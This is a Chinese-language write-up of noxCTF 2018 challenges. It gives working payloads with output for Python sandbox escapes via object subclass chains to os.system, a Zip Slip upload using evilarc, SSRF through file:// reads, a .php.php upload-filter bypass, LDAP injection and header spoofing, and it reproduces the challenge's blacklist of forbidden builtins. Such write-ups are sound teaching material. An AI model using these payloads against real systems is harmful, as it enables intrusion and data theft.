---
title: noxctf-writeup
abbrlink: 32469
date: 2018-09-08 12:06:28
tags:
---

# Misc

## pythonforfun

```
def fun(___________):
    c = a + b
    return c
```

填充参数，然后返回结果。

输入`a, b`正确。

给`b`赋予默认值`b=dir()[0]`,正确。

注意:

```
eval()函数只能计算单个表达式的值，而exec()函数可以动态运行代码段。
```

列目录:

`def fun(a, b=print(exec("import os"),eval("os.listdir('.')")))`

如果需要`eval`执行`python代码`，可以使用`compile()`构造代码, 并使`compile()`的`mode`参数为`exec`。

```
 def fun(a, b=print(eval(compile("import os", "<string>", "exec")),eval("os.listdir('.')"))):
```

读取flag:

```
def fun(a, b= print(open('Flag', 'r').read()))
```

其他payload:

```
a, b=__import__('os').system('cat FLAG')
a=exec('import subprocess'),b=exec("print(subprocess.getoutput('cat Flag'))")
a, b=__import__("subprocess").check_output(["cat","Flag"])
```



## pythonforfun2

```
def fun(a, b=print(exec("import os"),eval("os.listdir('.')")))
结果=> 
Illegal use! (exec)
```

存在沙箱，需要绕过。

```
NOT_ALLOWED = ['SystemExit', '__build_class__', '__import__', '__loader__', '__spec__', 'abs', 'ascii', 'bin',
               'bytearray', 'bytes', 'chr', 'compile', 'eval', 'exec', 'exit', 'format', 'frozenset', 'hex', 'input',
               'isinstance', 'issubclass', 'locals', 'map', 'memoryview', 'next', 'object', 'oct', 'ord', 'quit',
               'range', 'reversed', 'set', 'str', 'type', 'vars', '\\', '\'', ';', '[', ']', 'if', 'else', 'import',
               'const', 'join', 'replace', 'translate', 'try', 'except', 'with', 'content', 'frame', 'back', 'open',
               'os', 'sys', 'lower', 'subclass', 'globals', '__name__', '__doc__', '__package__', '__loader__',
               '__spec__', '__build_class__', '__import__', 'abs', 'all', 'any', 'ascii', 'bin', 'breakpoint',
               'callable', 'chr', 'compile', 'delattr', 'dir', 'divmod', 'eval', 'exec', 'format', 'getattr', 'globals',
               'hasattr', 'hash', 'hex', 'id', 'input', 'isinstance', 'issubclass', 'iter', 'len', 'locals', 'max',
               'min', 'next', 'oct', 'ord', 'pow', 'print', 'repr', 'round', 'setattr', 'sorted', 'sum', 'vars', 'None',
               'Ellipsis', 'NotImplemented', 'False', 'True', 'bool', 'memoryview', 'bytearray', 'bytes', 'classmethod',
               'complex', 'dict', 'enumerate', 'filter', 'float', 'frozenset', 'property', 'int', 'list', 'map',
               'object', 'range', 'reversed', 'set', 'slice', 'staticmethod', 'str', 'super', 'tuple', 'type', 'zip',
               '__debug__', 'BaseException', 'Exception', 'TypeError', 'StopAsyncIteration', 'StopIteration',
               'GeneratorExit', 'SystemExit', 'KeyboardInterrupt', 'ImportError', 'ModuleNotFoundError', 'OSError',
               'EnvironmentError', 'IOError', 'EOFError', 'RuntimeError', 'RecursionError', 'NotImplementedError',
               'NameError', 'UnboundLocalError', 'AttributeError', 'SyntaxError', 'IndentationError', 'TabError',
               'LookupError', 'IndexError', 'KeyError', 'ValueError', 'UnicodeError', 'UnicodeEncodeError',
               'UnicodeDecodeError', 'UnicodeTranslateError', 'AssertionError', 'ArithmeticError', 'FloatingPointError',
               'OverflowError', 'ZeroDivisionError', 'SystemError', 'ReferenceError', 'MemoryError', 'BufferError',
               'Warning', 'UserWarning', 'DeprecationWarning', 'PendingDeprecationWarning', 'SyntaxWarning',
               'RuntimeWarning', 'FutureWarning', 'ImportWarning', 'UnicodeWarning', 'BytesWarning', 'ResourceWarning',
               'ConnectionError', 'BlockingIOError', 'BrokenPipeError', 'ChildProcessError', 'ConnectionAbortedError',
               'ConnectionRefusedError', 'ConnectionResetError', 'FileExistsError', 'FileNotFoundError',
               'IsADirectoryError', 'NotAdirectoryError', 'InterruptedError', 'PermissionError', 'ProcessLookupError', '
               'TimeoutError', 'open', 'quit', 'exit', 'copyright', 'credits', 'license', 'help']
​````
```

可以通过查找`sys`模块来实现。

首先通过`''.__class__.__base__`或者`''.__class__.__mro__`获得`Object`类。

注意:

```
__base__列出其基类, __mro__给出了method resolution order，即解析方法调用的顺序。
```

然后获取`Object`所有子类。

由于`codecs.StreamReaderWriter` 或者`_NamespaceLoader`可以调用`sys`模块，首先找到`StreamReaderWriter`的下标。

```shell
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)
>>> ''.__class__.__mro__[1]
<class 'object'>
>>> for i,val in enumerate(''.__class__.__mro__[1].__subclasses__()):
...     if "Stream" in str(val):
...             print(i, "  ", val)
...
115    <class 'codecs.StreamReaderWriter'>
204    <class 'tarfile._StreamProxy'>
233    <class 'tarfile._Stream'>
248    <class 'contextlib._RedirectStream'>
279    <class 'codecs.StreamRecoder'>
>>> dir(''.__class__.__mro__[1].__subclasses__()[64].__init__)
['__annotations__', '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__globals__', '__gt__', '__hash__', '__init__', '__kwdefaults__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
>>> for i,val in enumerate(''.__class__.__mro__[1].__subclasses__()):
...     if "_NamespaceLoader" in str(val):
...             print(i, val)
...
41 <class '_frozen_importlib_external._NamespaceLoader'>
>>> ''.__class__.__mro__[1].__subclasses__()[41].__init__.__globals__["sys"].modules["os"].system('ls')
awd  bin  flag.txt  pwndbg  temp
```

获取对象属性值:

```shell
>>> ''.__class__.__mro__[1].__subclasses__()[115].__init__.__globals__ 
或者:
>>> for i, val in enumerate(getattr(''.__class__.__mro__[1].__subclasses__()[64].__init__, "__globals__")):
...     print(i, val)
...
0 utf_16_le_encode
1 getencoder
2 __name__
3 utf_32_be_encode
4 utf_7_decode
5 __builtins__
6 open
7 utf_32_encode
8 BOM_UTF16_BE
9 BOM32_BE
10 replace_errors
11 sys
................
>>> ''.__class__.__mro__[1].__subclasses__()[115].__init__.__globals__["sys"].modules["os"]
<module 'os' from '/usr/lib/python3.5/os.py'>
>>> ''.__class__.__mro__[1].__subclasses__()[115].__init__.__globals__["sys"].modules["os"].system('ls')
awd  bin  flag.txt  pwndbg  temp
```

payload:

```
def fun(a, b=''.__class__.__mro__[1].__subclasses__()[115].__init__.__globals__["sys"].modules["os"].system('cat Flag'))
or:
def fun(a,b,c=print([].__class__.__base__.__subclasses__()[127].__init__.__globals__['system']('ls'))):
or:
def fun(a=print(().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__["sys"].modules["os"].system("ls")), b=1)
```

## Slip Situation

前提: [Zip Slip漏洞综述](https://xz.aliyun.com/t/2382)

首页:

```html

<!DOCTYPE html>
<html lang="en">
<head>
  <title>ZIP ANALYZER</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
    <br/><br/><br/><br/><br/>
    <center>
        <h1>Welcome to the zip analysis demo!</h1>
        <h4>our amazing software will take your zip, unpack it and scan it for viruses</h4>
        <h4>we also track everything you do on this website in our admin control panel that is unbreachable, unhackable</h4>
        <h4>thanks to our amazing cyber-security team</h4>
        <h4>How does it work?</h4>
        <h5>You upload a zip file, our servers extract the file using bash command "unzip -: file.zip"</h5>
        <h5>the server scans the files inside and returns results!</h5>
        <h6>We dont believe in containers, all zip files are uploaded to /files/ directory and get extracted there for maximum security!</h6>
        <br/><br/><br/>
            <form method="post" enctype="multipart/form-data" action="/upload">
                <input class="form-control" type="file" name="file" accept="application/zip,application/x-zip,application/x-zip-compressed">
                <br/>
                <input type="submit" class="btn btn-primary" value="Upload .zip file">
            </form>
    </center>
<!-- Note to self : admin page link : /admin-->
</body>
</html>
```

`view-source:http://chal.noxale.com:1336/admin`

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <title>login!</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
    <br/><br/><br/><br/><br/>
    <center>
        <h1>4dm1n C0ntr0l P4n3l</h1>
        <br/><br/><br/>
        <form method="post" enctype="multipart/form-data" action="/upload">
            <div class="input-group">
                <span class="input-group-addon"><i class="glyphicon glyphicon-user"></i></span>
                <input id="email" type="text" class="form-control" name="email" placeholder="Email">
            </div>
            <div class="input-group">
                <span class="input-group-addon"><i class="glyphicon glyphicon-lock"></i></span>
                <input id="password" type="password" class="form-control" name="password" placeholder="Password">
            </div>
            <br/>
            <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#myModal">Login</buttoin>
        </form>
    </center>


    <!-- Modal -->
  <div class="modal fade" id="myModal" role="dialog">
    <div class="modal-dialog">
    
      <!-- Modal content-->
      <div class="modal-content">
        <div class="alert alert-danger">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Error</h4>
        </div>
        <div class="modal-body">
          <p>Signing in is currently disabled by the site owner, if you think this is an error please contact support at support@example.com</p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
      
    </div>
  </div>
  
</div>

    <!-- Note to self so i wont forget : if a file named key.txt containing the short ssid is found in the ./admin directory then you dont need to login with user and pass to save time -->
</body>
</html>
```

writeup: `https://www.pwndiary.com/write-ups/noxctf-2018-slippery-situation-write-up-misc750/`

> git clone https://github.com/ptoomey3/evilarc
>
> touch key.txt
>
>  ./evilarc.py key.txt -d 1 -p "admin" -o "unix"



或者:

```shell
ht@TIANJI:/mnt/c/Users/HT/Desktop/temp$ tree
.
├── a
└── admin
    └── key.txt
```

准备`../admin/file.txt`。

> cd a
>
> zip file.zip ../admin/file.txt

然后上传文件。

```shell
ht@TIANJI:/mnt/c/Users/HT/Desktop/temp/a$ curl --cookie "shortssid=6dWt51pE971H1z4LudGHnt01fhQbGDCg" 'http://chal.noxale.com:1336/admin'
VGhpcyBwYWdlIGlzIG9ubHkgYXZhaWxhYmxlIGZvciBBZG1pblBhbmVsIGJyb3dzZXIgdXNlcnMuDQoNCkFkbWluUGFuZWwvMC4xIGFnZW50IHVzZXJzIG9ubHkh
ht@TIANJI:/mnt/c/Users/HT/Desktop/temp/a$
ht@TIANJI:/mnt/c/Users/HT/Desktop/temp/a$ echo VGhpcyBwYWdlIGlzIG9ubHkgYXZhaWxhYmxlIGZvciBBZG1pblBhbmVsIGJyb3dzZXIgdXNlcnMuDQoNCkFkbWluUGFuZWwvMC4xIGFnZW50IHVzZXJzIG9ubHkh | base64 -d
This page is only available for AdminPanel browser users.

AdminPanel/0.1 agent users only!
```

需要修改`User-Agent`。

```shell
ht@TIANJI:/mnt/c/Users/HT/Desktop/temp/a$ curl -H "User-Agent: AdminPanel/0.1" --cookie "shortssid=6dWt51pE971H1z4LudGHnt01fhQbGDCg" 'http://chal.noxale.com:1336/admin'  | grep -Eo "no.*}"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   745    0   745    0     0    413      0 --:--:--  0:00:01 --:--:--   413
noxCTF{Z1p_Fil3s_Ar3_Fun_H4ha}
```

# Web

## Reference

修改`Referer` 为 `http://www.google.com`即可。

## myfileuplaod

使用正则表达式过滤，`.php$`存在问题，使用`.php.php` 即可绕过。

## hiddendom

```
<script>
			var _0x3bc3=["\x6D\x61\x69\x6E\x5F\x66\x6F\x72\x6D","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x69\x6E\x70\x75\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x6E\x61\x6D\x65","\x65\x78\x70\x72\x65\x73\x73\x69\x6F\x6E","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x74\x79\x70\x65","\x74\x65\x78\x74","\x70\x6C\x61\x63\x65\x68\x6F\x6C\x64\x65\x72","\x2F\x3C\x5B\x5E\x3C\x3E\x5D\x7B\x31\x2C\x7D\x68\x69\x64\x64\x65\x6E\x5B\x5E\x3C\x3E\x5D\x7B\x31\x2C\x7D\x3E\x2F"];var _frss=document[_0x3bc3[1]](_0x3bc3[0]);var _xEger=document[_0x3bc3[3]](_0x3bc3[2]);_xEger[_0x3bc3[6]](_0x3bc3[4],_0x3bc3[5]);_xEger[_0x3bc3[6]](_0x3bc3[7],_0x3bc3[8]);_xEger[_0x3bc3[6]](_0x3bc3[9],_0x3bc3[10])
		</script>
=> 
var form = document.getElementById("main_form");
var input = document.createElement("input");
input.setAttribute("name", "expression");
input.setAttribute("type", "text");
input.setAttribute("placeholder", "/<[^<>]{1,}hidden[^<>]{1,}>/");


var _0x2b80=["\x73\x6C\x6F\x77","\x66\x61\x64\x65\x4F\x75\x74","\x23\x68\x69\x64\x64\x65\x6E\x5F\x65\x6C\x65\x6D\x65\x6E\x74\x73","\x63\x6C\x69\x63\x6B","\x23\x68\x69\x64\x65\x41\x72\x65\x61","\x72\x65\x61\x64\x79","\x66\x61\x64\x65\x49\x6E","\x23\x73\x68\x6F\x77\x41\x72\x65\x61"];$(document)[_0x2b80[5]](function(){$(_0x2b80[4])[_0x2b80[3]](function(){$(_0x2b80[2])[_0x2b80[1]](_0x2b80[0])})});$(document)[_0x2b80[5]](function(){$(_0x2b80[7])[_0x2b80[3]](function(){$(_0x2b80[2])[_0x2b80[6]](_0x2b80[0])})})
=>
$(document).ready(function() {
    $("#hideArea").click(function() {
        $("#hidden_elements").fadeOut("slow");
    })
})

$(document).ready(function() {
    $("#showArea").click(function() {
    })
})
```

通过这段代码我们可以知道:

```
input.setAttribute("placeholder", "/<[^<>]{1,}hidden[^<>]{1,}>/");
```

除了可以传入参数`target`之外，还可以传递一个参数`expression`。

测试:

```
curl http://13.59.2.198:5588/index.php?target=http%3A%2F%2F127.0.0.1%2Findex.php
```

结果:

```
        <a href='/var/www/html/flag.txt' hidden>-_-</a><button id='showArea' class='button' style='margin-right:10px;'>show</button><button id='hideArea' class='button'>hide</button><br /><br /><textarea id='hidden_elements' rows='20' cols='85' style='background-color:#d1d1d1; color:#424242'>&lt;body background="hidden.jpg" style="background-size:cover;"&gt;
&lt;input type="text" name="target" placeholder="Find hidden elements (URL)" style="background-color:#d1d1d1; color:#717d85;"&gt;
</textarea >
```

发现，存在`SSRF`。

测试`file`协议:

```
curl http://13.59.2.198:5588/index.php?target=file:///var/www/html/flag.txt
```

没有回显，这是因为`/<[^<>]{1,}hidden[^<>]{1,}>/` 正则表达式不匹配。

```
curl http://13.59.2.198:5588/index.php?target=file:///var/www/html/flag.txt&expression=/nox.*/
```

```
ht@TIANJI:~$ curl "http://13.59.2.198:5588/?target=file:///var/www/html/flag.txt&expression=/nox.*/" | grep -Eo "noxCTF{.*}"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4772  100  4772    0     0   9724      0 --:--:-- --:--:-- --:--:--  9718
noxCTF{/[h1DD3N]*[55Rf]*[r393X]*/}
```

获取 `index.php` 源码。

```
curl http://13.59.2.198:5588/index.php?target=file:///var/www/html/index.php&expression=/.*/
```

使用如上payload，可以发现返回`Ammm... so close :)`。

可以使用如下payload，获取源码, 原因在于使用`strpos`函数直接匹配字符串所致。

```
curl "http://13.59.2.198:5588/?target=file:///var/www/html//index.php&expression=/.*/" > dom.html
```

```php
<?php
  echo "<a href='".realpath("flag.txt")."' hidden>-_-</a>";
	$pattern = "/<[^<>]{1,}hidden[^<>]{1,}>/"; // defult expression
	// check if got expression
	if(isset($_GET["expression"]))
	{
		$pattern = $_GET["expression"]; // set new regEx expression
	}
	// check if got 'target' parameter
	if (isset($_GET["target"]) && !empty($_GET["target"]))  
	{
		try
		{
			// get website/file content + (ignore warnings output)
			$content = @file_get_contents($_GET["target"]); 
			// check if fail read content
			if ( $content === FALSE ) 
			{
				echo "<p style='color:red;'></p>";
			}
			else
			{
				if (strpos($_GET["target"], 'http://') === 0 || strpos($_GET["target"], 'https://') === 0 || strpos($_GET["target"], 'file:///') === 0)
				{
				    $count = @preg_match_all($pattern, $content, $match);
    				$output = "";
    				for($i = 0; $i < $count; $i = $i + 1)
    				{
    					$str = $match[0][$i];
    					$str = str_replace(">" ,">" , $str);
    					$str = str_replace("<" ,"<" , $str);
    					$output = $output.$str."\n";
    				}
            // check if try index.php
           if (strpos($_GET["target"], '/html/index.php') !== false)
            {
              $output = "Ammm... so close :)";
            }
    		echo "<button id='showArea' class='button' style='margin-right:10px;'>show</button><button id='hideArea' class='button'>hide</button><br /><br /><textarea id='hidden_elements' rows='20' cols='85' style='background-color:#d1d1d1; color:#424242'>".$output."</textarea >\n\n";
			}
?>
```

## Dictionary of obscure sorrows

LDAP注入:

通过测试:

```
http://54.152.220.222/word.php?page=O*             => ok
http://54.152.220.222/word.php?page=S*             => ok
http://54.152.220.222/word.php?page=b*             => Query returned empty
http://54.152.220.222/word.php                     => Missing RDN inside ObjectClass(document)
```

可能存在`LDAP`注入。

根据https://oav.net/mirrors/LDAP-ObjectClasses.html，可以知道`ObjectClass`存在如下参数：

- commonName
- description
- seeAlso
- l
- o
- ou
- documentTitle
- documentVersion
- documentAuthor
- documentLocation
- documentPublisher

通过页面显示，我们可以知道，页面展示了两个字段`documentTitle` 以及`description`。

所以可以构造如下payload:

`http://54.152.220.222/word.php?page=*)(description=nox*`

```shell
ht@TIANJI:~$ curl "http://54.152.220.222/word.php?page=*)(description=nox*" | grep -Eo "nox.*}"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3872  100  3872    0     0   6829      0 --:--:-- --:--:-- --:--:--  6840
noxCTF{K1NG_0F_LD4P}
```

# Re

## GuessTheString

题目很清晰:

字符串符合以下条件即可:

```
 return (unsigned int)tiaojian_1((const char *)a1)
      && (unsigned int)tiaojian_2((_BYTE *)a1)
      && (unsigned int)tiaojian_3((char *)a1)
      && (unsigned int)tiaojian_4((_BYTE *)a1)
      && (unsigned int)tiaojian_5(a1)
      && (unsigned int)tiaojian_6(a1)
      && (unsigned int)tiaojian_7(a1)
      && (unsigned int)tiaojian_8(a1)
      && (unsigned int)tiaojian_9(v2, v8, a1)
      && (unsigned int)tiaojian_10(v10)
      && (unsigned int)tiaojian_11(v10, a2, v3, v4, v5, v6, v9, v10);
```

对应如下:

```
a[0] > 32
a[0] != 66 && a[0] * a[1] = 3478
a[0] ^ a[1] ^ a[2] = 49
a[3] > a[2] && byte(a[2] * a[2]) == byte(a[3] * a[3])       // 

a[4] 和 a[5] 应该是素数
a[4] ^ a[5] = 126            
a[6] = 2 * (a[5] - 42)   &&  a[6] / 2 应该是素数

47 < a[7] <= 57 && 4 * (a7 >> 2) = a7
a[8] == a[7] ^ 0x12               // 0x12 可以通过动态调试获取
2 * a[8] = a[9]
a[10] == HIBYTE(a[9]) * a[9]      // a[9] 已知，HIBYTE(a[9]) 没搞懂，可以动态调试获取
```

构造如下字符串:

```
/JTtC=&0"Dz
```

结果：

```shell
qianfa@qianfa:~/Desktop$ nc chal.noxale.com 22234
Enter your string: 
/JTtC=&0"Dz
Good job. Here is your flag: 
noxCTF{A5semb1y_Is_Grea7}
```

## Attention

